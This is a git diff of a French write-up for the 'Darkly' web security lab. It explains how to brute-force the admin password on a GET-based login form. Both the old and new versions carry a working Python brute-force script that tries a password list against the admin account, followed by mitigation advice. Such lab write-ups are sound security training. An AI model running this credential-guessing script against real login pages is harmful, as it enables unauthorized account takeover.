@@ -8,97 +8,84 @@ Le Brute Force est une attaque consistant à tester automatiquement une grande q
 
 ## Comment reproduire la faille
 
-1. Identifier le fonctionnement du formulaire
+1. Constater que la page de login (**SIGN IN**) utilise une requête GET lors de la soumission du formulaire : `http://10.13.248.4/?page=signin&username=admin&password=<TEST>&Login=Login#`
 
-La page de login utilise une requête GET lors de la soumission du formulaire :
-```http://10.13.248.4/?page=signin&username=admin&password=<TEST>&Login=Login#
-```
-L’absence de protection rend la page vulnérable au brute force.
+2. Créer un fichier contenant des mots de passe fréquents : `passwords.txt`
 
-2. Préparer une liste de mots de passe
+3. Utiliser un script Python pour tester automatiquement les mots de passe:  
 
-Créer un fichier contenant des mots de passe fréquents :
-```passwords.txt
-```
+    * Exemple de script :
+        ```python
+        import subprocess
+        import sys
 
-3. Utiliser un script Python pour tester automatiquement les mots de passe
 
-Exemple de script :
-```import requests
+        if len( sys.argv ) == 2:
+            url = f"http://{sys.argv[1]}/?page=signin"
+        else:
+            print("Error: please set the IP address in the script parameter")
+            exit(1)
 
-url = "http://10.13.248.4/?page=signin"
+        username = "admin"
 
-username = "admin"
-passwords_file = "passwords.txt"
+        with open("passwords.txt", "r") as f:
+            for pwd in f:
+                pwd = pwd.strip()
 
-FAIL_KEYWORD = "WrongAnswer"  # texte affiché lors d'un échec
+                cmd = [
+                    "curl", "-s",
+                    f"{url}&username={username}&password={pwd}&Login=Login#"
+                ]
 
-with open(passwords_file, "r") as f:
-    for pwd in f:
-        pwd = pwd.strip()
-        if not pwd:
-            continue
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                output = result.stdout
 
-        params = {
-            "page": "signin",
-            "username": username,
-            "password": pwd,
-            "Login": "Login#"
-        }
+                print(f"[ ] Test : {pwd}")
 
-        response = requests.get(url, params=params)
+                if "WrongAnswer" not in output:
+                    print("\n=== PASSWORD FOUND ===")
+                    print(f"username = {username}")
+                    print(f"password = {pwd}")
+                    break
+            else:
+                print("No password found")
 
-        print(f"[ ] Test : {pwd}")
+        ```
 
-        if FAIL_KEYWORD not in response.text:
-            print("\n=== MOT DE PASSE TROUVÉ ! ===")
-            print(f"username = {username}")
-            print(f"password = {pwd}")
-            break
-    else:
-        print("Aucun mot de passe valide trouvé.")
-```
+    * Lancer le script : `python3 script.py 10.13.248.4`
 
-Le script :
 
-lit chaque mot de passe du fichier,
 
-envoie une requête à l’URL vulnérable,
+4. Résultat:   
+    Lorsque le mot de passe correct est testé, le serveur renvoie une page différente.
+    Le script affiche alors :  
+    ```
+    === MOT DE PASSE TROUVÉ ! ===
+    username = admin
+    password = <mot_de_passe_trouvé>
+    ```
 
-détecte la réussite en observant l’absence du message d’erreur.
-
-4. Résultat
-
-Lorsque le mot de passe correct est testé, le serveur renvoie une page différente.
-Le script affiche alors :
-```=== MOT DE PASSE TROUVÉ ! ===
-username = admin
-password = <mot_de_passe_trouvé>
-```
-
-L’attaquant obtient ainsi un accès total au compte administrateur.
+5. Se connecter avec l'identifiant `admin` et le mot de passe trouvé par le script
 
 
 ## Recommandation pour empêcher la faille
 
-Pour éliminer la vulnérabilité, il est nécessaire de mettre en place :
+* Limiter le nombre de tentatives de connexion (rate limiting / lockout)
 
-Limitation du nombre de tentatives (rate limiting / lockout).
+* Mettre un temps d’attente progressif après plusieurs échecs
 
-Temps d’attente progressif après plusieurs échecs.
+* CAPTCHA après un certain nombre de tentatives
 
-CAPTCHA après un certain nombre de tentatives.
+* Méta-données de sécurité (IP tracking, alertes)
 
-Méta-données de sécurité (IP tracking, alertes).
+* Avoir un hash sécurisé des mots de passe (bcrypt/argon2)
 
-Hash sécurisé des mots de passe (bcrypt/argon2).
+* Faire une journalisation des tentatives anormales
 
-Journalisation des tentatives anormales.
-
-Ces protections permettent de rendre le brute force impraticable.
 
 ## Conclusion
 
-L’absence totale de mécanismes de sécurité sur la page de connexion de Darkly permet une attaque par brute force simple et rapide.
-Grâce à un script automatisé, il est possible de tester des centaines de mots de passe et d’accéder au compte admin.
-La mise en place de protections basiques côté serveur est indispensable pour empêcher ce type d’attaque.
+Le manque total de contrôles d’accès et de protections serveur contre les tentatives répétées d’authentification permet d'automatiser des centaines de tests de mots de passe jusqu’à obtenir un accès non autorisé.
+
+Cette faille montre l’importance de mettre en place des mesures minimales de sécurité, telles que le rate-limiting, les délais progressifs, la surveillance des échecs d’authentification et l’utilisation de mots de passe robustes.
+Avec une configuration correcte, ce type d’attaque peut être efficacement empêché et l’intégrité du système préservée.
